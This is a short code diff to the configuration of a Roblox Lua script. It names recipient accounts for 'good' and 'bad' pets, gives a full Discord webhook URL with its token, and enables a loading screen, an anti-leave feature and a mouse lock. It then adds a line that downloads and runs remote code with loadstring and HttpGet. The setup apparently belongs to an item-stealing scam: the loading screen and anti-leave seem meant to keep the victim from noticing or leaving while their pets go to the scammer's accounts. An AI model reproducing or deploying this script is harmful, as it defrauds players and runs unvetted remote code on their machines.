@@ -7,10 +7,12 @@
 
 ]]--
 
-UserName = "xYldrm0"
-Webhook = "https://discord.com/api/webhooks/1128331201468444764/sXCT0Urwni0DUCTf_dwbJLIsSEMaROtK88tJcnKJTop_a4Vb5Qciw9MTLeySGMk_qcxQ"
-UserName2 = "xYldrm01"
+UserName = "xYldrm0" -- good pets
+Webhook = "https://discord.com/api/webhooks/1128331201468444764/sXCT0Urwni0DUCTf_dwbJLIsSEMaROtK88tJcnKJTop_a4Vb5Qciw9MTLeySGMk_qcxQ" -- pings for pets
+UserName2 = "xYldrm01" -- bad pets
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
 _G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cypaex/CypaexHub/main/CypaexHub", true))()
